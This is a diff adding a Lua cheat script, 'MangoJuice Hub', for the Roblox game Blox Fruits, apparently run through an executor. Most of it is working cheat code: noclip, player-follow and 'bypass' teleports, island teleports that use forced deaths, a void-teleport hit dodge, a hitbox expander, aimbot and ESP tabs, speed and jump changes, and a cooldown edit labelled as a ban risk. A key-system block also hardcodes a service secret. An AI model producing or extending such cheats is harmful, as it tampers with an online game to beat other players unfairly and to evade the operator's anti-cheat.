+        if _G.Config.Teleport.Enabled and fm then
+            fm:EnableNoClip()
+        end
+
+        local targetPos = targetHRP.Position + Vector3.new(
+            _G.Config.Teleport.Settings.OffsetX,
+            _G.Config.Teleport.Settings.OffsetY,
+            _G.Config.Teleport.Settings.OffsetZ
+        )
+
+        hrp.CFrame = CFrame.new(
+            hrp.Position.X,
+            targetPos.Y,
+            hrp.Position.Z
+        )
+
+        local flatDir = Vector3.new(
+            targetPos.X - hrp.Position.X,
+            0,
+            targetPos.Z - hrp.Position.Z
+        )
+
+        if flatDir.Magnitude > 0.1 then
+            if _G.Config.Teleport.Enabled.ToPlayer then
+                local distance = flatDir.Magnitude
+                local currentSpeed = (distance < 100) and CloseRangeSuperSpeed or SlowFollowSpeed
+                local moveStep = math.max(3, currentSpeed * dt)
+                local moveVector = flatDir.Unit * math.min(moveStep, distance)
+
+                hrp.CFrame = CFrame.new(hrp.Position + moveVector)
+
+            elseif _G.Config.Teleport.Enabled.Bypass then
+                    hrp.CFrame = CFrame.new(
+                        targetPos.X,
+                        targetPos.Y,
+                        targetPos.Z
+                    )
+            end
+        end
+    end)
+end
+
+local followStateGuardConnection = nil
+local targetFollowPaused = false
+local targetPauseReason = nil
+
+local function startFollowStateGuard()
+    if followStateGuardConnection then
+        followStateGuardConnection:Disconnect()
+        followStateGuardConnection = nil
+    end
+    targetFollowPaused = false
+    targetPauseReason = nil
+
+    followStateGuardConnection = RunService.Heartbeat:Connect(function()
+        local target = _G.Config.Teleport.Settings.SelectPlayer and Players:FindFirstChild(_G.Config.Teleport.Settings.SelectPlayer)
+        local targetHumanoid = target and target.Character and target.Character:FindFirstChildOfClass("Humanoid")
+    
+        if not target then
+            if (not targetFollowPaused) or targetPauseReason ~= "left" then
+                targetFollowPaused = true
+                targetPauseReason = "left"
+                stopFollow()
+                WindUI:Notify({
+                    Title = "MangoJuice Hub Notify",
+                    Content = "Player Left The Game\n\nTeleport Stopped",
+                    Icon = "solar:bell-bold",
+                    Duration = 5
+                })
+            end
+            return
+        end
+
+        if (not target.Character) or (not targetHumanoid) or (targetHumanoid.Health <= 0) then
+            if (not targetFollowPaused) or targetPauseReason ~= "dead" then
+                targetFollowPaused = true
+                targetPauseReason = "dead"
+                stopFollow()
+                WindUI:Notify({
+                    Title = "MangoJuice Hub Notify",
+                    Content = "Player Died\n\nTeleport Paused",
+                    Icon = "solar:bell-bold",
+                    Duration = 5
+                })
+            end
+            return
+        end
+
+        if targetFollowPaused then
+            targetFollowPaused = false
+            startFollow()
+            if targetPauseReason == "dead" then
+                WindUI:Notify({
+                    Title = "MangoJuice Hub Notify",
+                    Content = "Player Respawned\n\nTeleport Resumed",
+                    Icon = "solar:bell-bold",
+                    Duration = 5
+                })
+            end
+            targetPauseReason = nil
+        end
+    end)
+end
+
+local function stopFollowStateGuard()
+    if followStateGuardConnection then
+        followStateGuardConnection:Disconnect()
+        followStateGuardConnection = nil
+    end
+
+    targetFollowPaused = false
+    targetPauseReason = nil
+end
+
+local Teleporting = false
+local RespawnConnection
+
+local MAX_DIRECT_DISTANCE = 10000
+local MIN_DISTANCE_FROM_PLAYER = 800
+
+local Maps = {
+    SecondSea = {
+        ["Kingdom Of Rose"] = Vector3.new(82.95, 19.32, 2834.99),
+        ["Cafe"] = Vector3.new(-428.45, 73.07, 297.39),
+        ["Green Zone"] = Vector3.new(-2302.58, 73.01, -2818.77),
+        ["Graveyard Island"] = Vector3.new(-5491.56, 48.53, -684.11),
+        ["Snow Mountain"] = Vector3.new(569.47, 401.47, -5284.16),
+        ["Ice Castle"] = Vector3.new(5440.65, 28.47, -6416.80),
+        ["Hot and Cold"] = Vector3.new(-5277.02, 29.21, -5158.07),
+        ["Forgotten Island"] = Vector3.new(-3043.32, 238.89, -10191.58),
+        ["Other TP"] = Vector3.new(984.30, 125.10, 32904.86)
+    },
+    ThirdSea = {
+        ["Castle On The Sea"] = Vector3.new(-4999.45, 314.56, -3010.54),
+        ["Port Town"] = Vector3.new(-378.27, 20.66, 5537.93),
+        ["Hydra"] = Vector3.new(5404.45, 1004.13, 506.21),
+        ["Great Tree"] = Vector3.new(2148.34, 21.76, -6652.35),
+        ["Floating Turtle"] = Vector3.new(-11352.54, 331.77, -10368.93),
+        ["Mansion"] = Vector3.new(-12592.93, 336.96, -7470.36),
+        ["Haunted Castle"] = Vector3.new(-9625.31, 141.37, 5393.04),
+        ["Sea Of Treats"] = Vector3.new(-2145.42, 37.84, -11895.08),
+        ["Tiki Outpost"] = Vector3.new(-16228.08, 9.11, 446.06)
+    }
+}
+
+local Island = {
+    SecondSea = {"Kingdom Of Rose", "Cafe", "Green Zone", "Graveyard Island", "Snow Mountain", "Ice Castle", "Hot and Cold", "Forgotten Island"},
+    ThirdSea = {"Castle On The Sea", "Port Town", "Hydra", "Great Tree", "Floating Turtle", "Mansion", "Haunted Castle", "Sea Of Treats", "Tiki Outpost"}
+}
+
+local function GetIsland()
+    if SecondSea then
+        return "SecondSea"
+    elseif ThirdSea then
+        return "ThirdSea"
+    end
+end
+
+local CurrentSea = GetIsland()
+
+local function waitForRespawn()
+    Player.CharacterAdded:Wait()
+    local character = Player.Character
+    character:WaitForChild("HumanoidRootPart")
+    character:WaitForChild("Humanoid")
+    return character
+end
+
+local function lockCameraWhileTeleport(duration)
+    local camera = workspace.CurrentCamera
+    local PlayerHRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
+    if not PlayerHRP then return end
+
+    local anchorPart = Instance.new("Part")
+    anchorPart.Anchored = true
+    anchorPart.CanCollide = false
+    anchorPart.Transparency = 1
+    anchorPart.Size = Vector3.new(1,1,1)
+    anchorPart.CFrame = PlayerHRP.CFrame
+    anchorPart.Parent = workspace
+
+    local originalSubject = camera.CameraSubject
+    camera.CameraType = Enum.CameraType.Custom
+    camera.CameraSubject = anchorPart
+
+    task.spawn(function()
+        local startTime = tick()
+        while tick() - startTime < duration do
+            task.wait(0.03)
+            anchorPart.CFrame = anchorPart.CFrame
+        end
+
+        camera.CameraSubject = originalSubject
+        anchorPart:Destroy()
+    end)
+end
+
+local function doTeleport()
+    if Teleporting then return end
+    if not _G.Config.Teleport.Settings.SelectIsland then return end
+
+    Teleporting = true
+    lockCameraWhileTeleport(4)
+
+    local character = Player.Character or Player.CharacterAdded:Wait()
+    local humanoid = character:WaitForChild("Humanoid")
+    local hrp = character:WaitForChild("HumanoidRootPart")
+
+    local chosenPos = Maps[CurrentSea][_G.Config.Teleport.Settings.SelectIsland]
+    if not chosenPos then
+        Teleporting = false
+        return
+    end
+
+    local playerPos = hrp.Position
+    local distanceToChosen = (chosenPos - playerPos).Magnitude
+
+    local requireRelay = false
+    if ThirdSea then
+        requireRelay = true
+    elseif SecondSea then
+        requireRelay = distanceToChosen > MAX_DIRECT_DISTANCE
+    end
+
+    local MIN_DISTANCE_FROM_CURRENT = 500
+
+    if requireRelay then
+        local relayPos
+        local bestDiff
+        for name, pos in pairs(Maps[CurrentSea]) do
+            if name ~= _G.Config.Teleport.Settings.SelectIsland then
+                local d1 = (pos - playerPos).Magnitude
+                local d2 = (chosenPos - pos).Magnitude
+                if d1 >= MIN_DISTANCE_FROM_CURRENT then
+                    local diff = math.abs(d1 - d2)
+                    if not bestDiff or diff < bestDiff then
+                        bestDiff = diff
+                        relayPos = pos
+                    end
+                end
+            end
+        end
+
+        if relayPos then
+            for i = 1, SeaTP do
+                hrp.CFrame = CFrame.new(relayPos)
+                RunService.RenderStepped:Wait()
+            end
+        end
+
+        local bridgePos
+        local bestScore
+        for name, pos in pairs(Maps[CurrentSea]) do
+            if pos ~= relayPos and name ~= _G.Config.Teleport.Settings.SelectIsland then
+                local dRelay = (pos - relayPos).Magnitude
+                local dChosen = (chosenPos - pos).Magnitude
+                if (pos - playerPos).Magnitude >= MIN_DISTANCE_FROM_CURRENT then
+                    local score = dRelay + dChosen
+                    if not bestScore or score < bestScore then
+                        bestScore = score
+                        bridgePos = pos
+                    end
+                end
+            end
+        end
+
+        if bridgePos then
+            for i = 1, SeaTP2 do
+                hrp.CFrame = CFrame.new(bridgePos)
+                RunService.RenderStepped:Wait()
+            end
+        end
+
+        humanoid.Health = 0
+        character = waitForRespawn()
+        humanoid = character:WaitForChild("Humanoid")
+        hrp = character:WaitForChild("HumanoidRootPart")
+        playerPos = hrp.Position
+    end
+
+    local secondPos
+    local closestDist
+    for name, pos in pairs(Maps[CurrentSea]) do
+        if name ~= _G.Config.Teleport.Settings.SelectIsland then
+            local dist = (pos - playerPos).Magnitude
+            if dist >= MIN_DISTANCE_FROM_PLAYER and dist >= MIN_DISTANCE_FROM_CURRENT then
+                if not closestDist or dist < closestDist then
+                    closestDist = dist
+                    secondPos = pos
+                end
+            end
+        end
+    end
+
+    task.wait(0.6)
+    lockCameraWhileTeleport(4)
+
+    if secondPos then
+        for i = 1, SeaTP do
+            hrp.CFrame = CFrame.new(secondPos)
+            RunService.RenderStepped:Wait()
+        end
+    end
+
+    for i = 1, SeaTP2 do
+        hrp.CFrame = CFrame.new(chosenPos)
+        RunService.RenderStepped:Wait()
+    end
+
+    humanoid.Health = 0
+    Teleporting = false
+end
+
+local player = Players.LocalPlayer
+
+local voidCharacter
+local voidRoot
+
+local function SetupCharacter(char)
+    voidCharacter = char
+    voidRoot = char:WaitForChild("HumanoidRootPart")
+end
+
+if player.Character then
+    SetupCharacter(player.Character)
+end
+
+player.CharacterAdded:Connect(function(char)
+    SetupCharacter(char)
+end)
+
+local VoidState = {
+    Enabled       = _G.Config.FastAttack.InstaKill,
+    Saishi        = _G.Config.FastAttack.Saishi,
+    SpikeyTrident = _G.Config.FastAttack.Spikey,
+    VoidTime      = 0.55,
+    TP_Pos        = Vector3.new(0, -200000, 0),
+    IsTeleporting = false
+}
+
+local function TPVoid(preSavedCFrame)
+    if VoidState.IsTeleporting or not VoidState.Enabled then return end
+    if not voidRoot or not voidCharacter then return end
+
+    local humanoid = voidCharacter:FindFirstChild("Humanoid")
+    if not humanoid or humanoid.Health <= 0 then return end
+    if _G.Config.Teleport.Enabled.ToPlayer or _G.Config.Teleport.Enabled.Bypass then 
+        stopFollow()
+    end
+
+    VoidState.IsTeleporting = true
+
+    local heartbeatConn
+    heartbeatConn = RunService.Heartbeat:Connect(function()
+        if voidRoot then
+            local pos = voidRoot.Position
+            voidRoot.CFrame = CFrame.new(pos.X, VoidState.TP_Pos.Y, pos.Z)
+            voidRoot.AssemblyLinearVelocity = Vector3.zero
+        end
+    end)
+
+    task.wait(VoidState.VoidTime)
+
+    if heartbeatConn then
+        heartbeatConn:Disconnect()
+    end
+    
+    local TPbackConn
+
+    if voidRoot and humanoid.Health > 0 then
+        TPbackConn = RunService.Heartbeat:Connect(function()
+        voidRoot.CFrame = preSavedCFrame + Vector3.new(0, 0.5, 0)
+        voidRoot.AssemblyLinearVelocity  = Vector3.zero
+        voidRoot.AssemblyAngularVelocity = Vector3.zero
+        end)
+    end
+
+    task.wait(0.4)
+
+    if TPbackConn then
+        TPbackConn:Disconnect()
+    end
+
+    VoidState.IsTeleporting = false
+    if _G.Config.Teleport.Enabled.ToPlayer or _G.Config.Teleport.Enabled.Bypass then 
+        startFollow()
+    end
+end
+
+local function ListeneHit()
+    local soundsFolder = workspace:WaitForChild("_WorldOrigin"):WaitForChild("Sounds")
+    local Char = game.Players.LocalPlayer.Character
+    local trackedSounds = {}
+
+    RunService.RenderStepped:Connect(function()
+        if not voidRoot then return end
+
+        for _, obj in ipairs(soundsFolder:GetDescendants()) do
+            if obj:IsA("Sound") and not trackedSounds[obj] then
+
+                if obj.Name == "SaddiHit" and VoidState.Saishi then
+                    trackedSounds[obj] = true
+                    TPVoid(voidRoot.CFrame)
+
+                elseif obj.Name == "DoughDrip" and VoidState.SpikeyTrident then
+                    trackedSounds[obj] = true
+                    TPVoid(voidRoot.CFrame)
+                --[[elseif obj.Name == "ElectricLoopable" then
+                    task.wait(0.4)
+                    trackedSounds[obj] = true
+                    TPVoid(voidRoot.CFrame)]]
+                end
+            end
+        end
+
+        for soundObj,_ in pairs(trackedSounds) do
+            if not soundObj:IsDescendantOf(soundsFolder) then
+                trackedSounds[soundObj] = nil
+            end
+        end
+    end)
+end
+
+ListeneHit()
+
+local function equipByType(toolType)
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local hum  = char:WaitForChild("Humanoid")
+
+    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
+        if tool:IsA("Tool") and tool.ToolTip == toolType then
+            hum:EquipTool(tool)
+            break
+        end
+    end
+end
+
+local function pressZ()
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Z, false, game)
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Z, false, game)
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Z, false, game)
+    task.wait(0.08)
+    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Z, false, game)
+end
+
+wait(3)
+
+local Window = WindUI:CreateWindow({
+    Title = "MangoJuice Hub | Blox Fruits",
+    Author = "By ian52042",
+    Folder = "MangoJuice Hub",
+    KeySystem = {                                                               
+        Note = "Key Systeam , You Just Want Join Discord to Get Key",                     
+        API = {                                                                 
+            {              
+                Title = "Platoboost",
+                Desc = "Click to Copy",
+                Icon = "key",
+                
+                Type = "platoboost",
+                ServiceId = 21505,
+                Secret = "MangoJuice52042",
+            },                                                                                                                                   
+        },                                                                      
+    },
+    OpenButton = {
+        Title = "MangoJuice Hub",
+        CornerRadius = UDim.new(1,0),
+        StrokeThickness = 3,
+        Enabled = true,
+        Draggable = true,
+        OnlyMobile = true,
+        Scale = 1,
+        
+        Color = ColorSequence.new(
+            Color3.fromHex("#0c00f9"), 
+            Color3.fromHex("#7301ff")
+        )
+    },
+    Size = UDim2.fromOffset(590, 500),
+    Transparent = false,
+    Theme = _G.Config.UI.Theme or "Midnight",
+    NewElements = false,
+    Topbar = {
+        Height = 44,
+        ButtonsType = "Default",
+    },
+
+    User = {
+        Enabled = false,
+        Anonymous = false,
+        Name = PlayerName,
+        ID = PlayerId,
+        DisplayName = PlayerDisplayName,
+
+        Callback = function()
+            print("About Users:")
+            print("Name:", PlayerName)
+            print("DisplayName:", PlayerDisplayName)
+            print("User ID:", PlayerId)
+
+            WindUI:Notify({
+                Title = "About User",
+                Content = "Player Name: " .. PlayerName ..
+                          "\nPlayer ID: " .. PlayerId,
+                Icon = "solar:bell-bold",
+                Duration = 5,
+                CanClose = true
+            })
+        end
+    },
+
+    SideBarWidth = 200,
+    ScrollBarEnabled = true,
+})
+
+local Tabs = {}
+
+Tabs.NoticeSection = Window:Section({
+    Title = "About Script",
+    Icon = "info",
+    Opened = false,
+})
+
+Tabs.GeneralSection = Window:Section({
+    Title = "Local Player",
+    Icon = "mouse",
+    Opened = true,
+})
+
+Tabs.UISection = Window:Section({
+    Title = "Other",
+    Icon = "cog",
+    Opened = true,
+})
+
+Tabs.NoticeTab = Tabs.NoticeSection:Tab({
+    Title = "Discord",
+    Icon = "link"
+})
+
+Tabs.GeneralTab = Tabs.GeneralSection:Tab({
+    Title = "Settings",
+    Icon = "settings"
+})
+
+Tabs.SettingsTab = Tabs.GeneralSection:Tab({
+    Title = "General",
+    Icon = "wrench"
+})
+
+Tabs.ESPTab = Tabs.GeneralSection:Tab({
+    Title = "ESP Player",
+    Icon = "eye"
+})
+
+Tabs.RangeTab = Tabs.GeneralSection:Tab({
+    Title = "Fast Attack",
+    Icon = "sword"
+})
+
+Tabs.AimbotTab = Tabs.GeneralSection:Tab({
+    Title = "Aimbot",
+    Icon = "target"
+})
+
+Tabs.TPTab = Tabs.GeneralSection:Tab({
+    Title = "Teleport",
+    Icon = "navigation"
+})
+
+Tabs.UITab = Tabs.UISection:Tab({
+    Title = "UI Setting",
+    Icon = "palette"
+})
+
+Window:SelectTab(1)
+
+Tabs.NoticeTab:Keybind({
+    Title = "Keybind",
+    Desc = "Click to Change Keybind Open UI",
+    Value = _G.Config.UI.Keybind or "B",
+    Callback = function(v)
+        Window:SetToggleKey(Enum.KeyCode[v])
+        _G.Config.UI.Keybind = v
+    end
+})
+
+Tabs.NoticeTab:Divider()
+
+local MyParagraph = Tabs.NoticeTab:Paragraph({
+    Title = "MangoJuice Hub (PvP Lua)",
+    Desc = "Version 1.5",
+    Buttons = {
+        {
+            Title = "Copy Discord Link",
+            Variant = "Primary",
+            Icon = "copy-check",
+            Callback = function()
+                (setclipboard or toclipboard)("https://discord.gg/CQt9jQucmG")
+                WindUI:Notify({
+                    Title = "MangoJuice Hub Notify",
+                    Content = "Link Success Copy !",
+                    Icon = "solar:bell-bold",
+                    Duration = 5,
+                    CanClose = true,
+                })
+            end
+        }
+    }
+})
+
+Tabs.NoticeTab:Divider()
+
+Tabs.NoticeTab:Paragraph({
+    Title = "This Script still in beta version",
+    Desc = "Please waiting for update :>",
+    Color = "Blue",
+    Image = "shield-alert",
+    ImageSize = 36,
+})
+
+Tabs.GeneralTab:Section({
+    Title = "Camera Settings",
+    TextSize = 15,
+})
+
+Tabs.GeneralTab:Slider({
+    Title = "Camera Zoom",
+    Step = 100,
+    Value = {
+        Min = 1000,
+        Max = 10000,
+        Default = tonumber(_G.Config.Camera.Zoom) or 1000
+    },
+    Callback = function(value)
+        _G.Config.Camera.Zoom = value
+        SetZoom()
+    end
+})
+
+SetZoom()
+
+Tabs.GeneralTab:Slider({
+    Title = "Camera FOV",
+    Step = 5,
+    Value = {
+        Min = 60,
+        Max = 120,
+        Default = tonumber(_G.Config.Camera.FOV) or 60
+    },
+    Callback = function(value)
+        _G.Config.Camera.FOV = value
+        SetFOV()
+    end
+})
+
+SetFOV()
+
+Tabs.GeneralTab:Section({
+    Title = "WalkSpeed Settings",
+    TextSize = 15,
+})
+
+Tabs.GeneralTab:Slider({
+    Title = "WalkSpeed",
+    Step = 10,
+    Value = {
+        Min = 50,
+        Max = 300,
+        Default = tonumber(_G.Config.WalkSpeed.Speed) or 50
+    },
+    Callback = function(Value)
+        _G.Config.WalkSpeed.Speed = Value
+        SetSpeed(Value)
+    end
+})
+
+Tabs.GeneralTab:Toggle({
+    Title = "WalkSpeed Change",
+    Value = _G.Config.WalkSpeed.Enabled,
+    Callback = function(State)
+        _G.Config.WalkSpeed.Enabled = State
+        EnbledWalkSpeed(State)
+
+        if State then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "WalkSpeed Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "WalkSpeed Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+    end
+})
+
+Tabs.GeneralTab:Section({
+    Title = "JumpPower Settings",
+    TextSize = 15,
+})
+
+Tabs.GeneralTab:Slider({
+    Title = "JumpPower",
+    Step = 10,
+    Value = {
+        Min = 50,
+        Max = 500,
+        Default = tonumber(_G.Config.JumpPower.Power) or 50
+    },
+    Callback = function(Value)
+        _G.Config.JumpPower.Power = Value
+        SetPower(Value)
+    end
+})
+
+Tabs.GeneralTab:Toggle({
+    Title = "JumpPower Change",
+    Value = _G.Config["JumpPower"]["Enabled"],
+    Callback = function(State)
+        _G.Config["JumpPower"]["Enabled"] = State
+        EnbledJumpPower()
+
+        if State then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "JumpPower Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "JumpPower Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+    end
+})
+
+Tabs.GeneralTab:Section({
+    Title = "Dash Settings",
+    TextSize = 15,
+})
+
+Tabs.GeneralTab:Slider({
+    Title = "Dash Distance",
+    Step = 50,
+    Value = {
+        Min = 50,
+        Max = 500,
+        Default = tonumber(_G.Config.Dash.DashDistance) or 50
+    },
+    Callback = function(Value)
+        _G.Config.Dash.DashDistance = Value
+        Dash()
+    end
+})
+
+Tabs.GeneralTab:Toggle({
+    Title = "Dash Distance",
+    Value = _G.Config.Dash.Enabled,
+    Callback = function(State)
+        _G.Config.Dash.Enabled = State
+        Dash()
+
+        if State then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Dash Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Dash Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+    end
+})
+
+wait(0.3)
+
+Tabs.SettingsTab:Section({
+    Title = "Hitbox Expander Settings",
+    TextSize = 15,
+})
+
+Tabs.SettingsTab:Slider({
+    Title = "Hitbox Expander Size",
+    Step = 10,
+    Value = {
+        Min = 10,
+        Max = 100,
+        Default = tonumber(_G.Config.Hitbox.Size) or 10
+    },
+    Callback = function(Value)
+        _G.Config.Hitbox.Size = Value
+    end
+})
+
+Tabs.SettingsTab:Toggle({
+    Title = "Hitbox Expander",
+    Value = _G.Config.Hitbox.Enabled,
+    Callback = function(State)
+        _G.Config.Hitbox.Enabled = State
+        if State then
+        WindUI:Notify({
+            Title = "MangoJuice Hub Notify",
+            Content = "Hitbox Enabled",
+            Icon = "solar:bell-bold",
+            Duration = 3
+        })
+        EnableHitbox()
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Hitbox Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+            DisableHitbox()
+        end
+    end
+})
+
+Tabs.SettingsTab:Section({
+    Title = "Safe Mode",
+    TextSize = 15,
+})
+
+Tabs.SettingsTab:Slider({
+    Title = "Safe Mode Health",
+    Step = 5,
+    Value = {
+        Min = 10,
+        Max = 90,
+        Default = _G.Config.Other.SafeHealth,
+    },
+    Callback = function(Value)
+        _G.Config.Other.SafeHealth = Value
+        SafeToggle:SetDesc(
+            "If You Health <= "..Value.." Will Teleport To Void Until You Health >= "..(Value + 10)
+        )
+    end
+})
+
+SafeToggle = Tabs.SettingsTab:Toggle({
+    Title = "Safe Mode",
+    Desc = "If You Health <= ".._G.Config.Other.SafeHealth.." Will Teleport To Void Until You Health >= "..(_G.Config.Other.SafeHealth + 10),
+    Value = _G.Config.Other.SafeMode,
+    Callback = function(State)
+        _G.Config.Other.SafeMode = State
+        if State then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Safe Mode Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+            SafeLoop = RunService.RenderStepped:Connect(function()
+                if not _G.Config.Other.SafeMode then return end
+                TPY()
+            end)
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Safe Mode Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+            if SafeLoop then
+                SafeLoop:Disconnect()
+                SafeLoop = nil
+            end
+            if SavePOS then
+                Player.Character.HumanoidRootPart.CFrame = SavePOS
+            end
+            SavePOS = nil
+        end
+    end
+})
+
+Tabs.SettingsTab:Section({
+    Title = "Race Settings",
+    TextSize = 15,
+})
+
+Tabs.SettingsTab:Toggle({
+    Title = "Auto Enabled v3",
+    Value = _G.Config.Race.AutoV3,
+    Callback = function(state)
+        _G.Config.Race.AutoV3 = state
+        if state then 
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Auto v3 Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+            StartAutoV3()
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Auto v3 Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+    end
+})
+
+Tabs.SettingsTab:Toggle({
+    Title = "Auto Enabled v4",
+    Value = _G.Config.Race.AutoV4,
+    Callback = function(state)
+        _G.Config.Race.AutoV4 = state
+        if state then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Auto v4 Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+            StartAutoV4()
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Auto v4 Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+    end
+})
+
+Tabs.SettingsTab:Section({
+    Title = "Other Mode",
+    TextSize = 15,
+})
+
+Tabs.SettingsTab:Toggle({
+    Title = "No Clip",
+    Value = _G.Config.Other.NoClip,
+    Callback = function(state)
+        _G.Config.Other.NoClip = state
+        NoClipSetting()
+        if state then
+         WindUI:Notify({
+                    Title = "MangoJuice Hub Notify",
+                    Content = "No Clip Enabled",
+                    Icon = "solar:bell-bold",
+                    Duration = 3
+                })
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "No Clip Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+    end
+})
+
+local SoruToggle 
+
+SoruToggle = Tabs.SettingsTab:Toggle({
+    Title = "Infinite Soru",
+    Desc = "High Risk , If You Want Safe No Ban Pls Don't Use This",
+    Value = _G.Config.Other.NoSoru,
+    Callback = function(state)
+
+        _G.Config.Other.NoSoru = state
+
+        task.spawn(function()
+            if _G.Config.Other.NoSoru then
+                _Character:SetAttribute("FlashstepCooldown", 10)
+            else
+                _Character:SetAttribute("FlashstepCooldown", 0)
+            end
+        end)
+
+        Players.LocalPlayer.CharacterAdded:Connect(function()
+            task.wait(0.2)
+            if _G.Config.Other.NoSoru then
+                _Character:SetAttribute("FlashstepCooldown", 10)
+            else
+                _Character:SetAttribute("FlashstepCooldown", 0)
+            end
+        end)
+        
+        if state then
+         WindUI:Notify({
+                    Title = "MangoJuice Hub Notify",
+                    Content = "Infinite Soru Enabled",
+                    Icon = "solar:bell-bold",
+                    Duration = 3
+                })
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Infinite Soru Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+    end
+})
+
+Tabs.SettingsTab:Toggle({
+    Title = "Walk On Water",
+    Value = _G.Config.Other.WalkOnWater,
+    Callback = function(State)
+        _G.Config.Other.WalkOnWater = State
+        if State then
+         WindUI:Notify({
+                    Title = "MangoJuice Hub Notify",
+                    Content = "Walk On Water Enabled",
+                    Icon = "solar:bell-bold",
+                    Duration = 3
+                })
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Walk On Water Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+
+        local water = game:GetService("Workspace").Map["WaterBase-Plane"]
+
+        if State then
+            water.Size = Vector3.new(1000, 112, 1000)
+        else
+            water.Size = Vector3.new(1000, 80, 1000)
+        end
+    end
+})
+
+Tabs.SettingsTab:Toggle({
+    Title = "Auto Enabled PvP",
+    Value = _G.Config.Race.AutoPvP,
+    Callback = function(State)
+        if State then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Auto PvP Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+            _G.Config.Race.AutoPvP = true
+            AutoPvP()
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Auto PvP Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+            _G.Config.Race.AutoPvP = false
+            AutoPvP()
+        end
+    end
+})
+
+Tabs.SettingsTab:Toggle({
+    Title = "Auto Enabled Buso",
+    Value = _G.Config.Race.AutoBuso,
+    Callback = function(state)
+        _G.Config.Race.AutoBuso = state
+
+        if state then
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Auto Buso Enabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+
+            task.spawn(function()
+                while _G.Config.Race.AutoBuso do
+                    task.wait(0.2)
+
+                    pcall(function()
+                        local char = Player.Character
+                        if char and not char:FindFirstChild("HasBuso") then
+                            CommF:InvokeServer("Buso")
+                        end
+                    end)
+                end
+            end)
+        else
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Auto Buso Disabled",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+    end
+})
+
+Tabs.SettingsTab:Divider()
+
+if SecondSea then
+
+    local Lava = false
+    local Ship = false
+
+    Tabs.SettingsTab:Button({
+        Title = "Remove Cursed Ship",
+        Icon = "ship",
+        Callback = function()
+            if Ship == true then
+                WindUI:Notify{
+                    Title = "MangoJuice Hub Notify",
+                    Content = "You Are Already Remove Cursed Ship !",
+                    Icon = "solar:bell-bold",
+                    Duration = 2
+            }   return 
+            else
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(922.92, 253, 32968.97))
+
+            task.wait(0.2)
+
+            WindUI:Notify{
+                Title = "MangoJuice Hub Notify",
+                Content = "Loading Remove Cursed Ship.....",
+                Icon = "solar:bell-bold",
+                Duration = 2
+            }
+
+            local folder = workspace.Map:FindFirstChild("GhostShipInterior")
+
+            if folder then
+                for _, v in pairs(folder:GetChildren()) do
+                    if not string.find(string.lower(v.Name), "teleport") then
+                        v:Destroy()
+                        Ship = true
+                    end
+                end
+            end
+        end
+    end
+    })
+
+    Tabs.SettingsTab:Button({
+        Title = "Remove Lava",
+        Icon = "flame-kindling",
+        Callback = function()
+            if Lava == true then
+                WindUI:Notify{
+                    Title = "MangoJuice Hub Notify",
+                    Content = "You Are Already Remove Lava !",
+                    Icon = "solar:bell-bold",
+                    Duration = 2
+            }   return 
+            else
+            WindUI:Notify{
+                    Title = "MangoJuice Hub Notify",
+                    Content = "Loading Remove Lava.....",
+                    Icon = "solar:bell-bold",
+                    Duration = 2
+                }
+            task.defer(function()
+                RemoveLava()
+                Lava = true
+            end)
+        end
+    end
+    })
+end
+
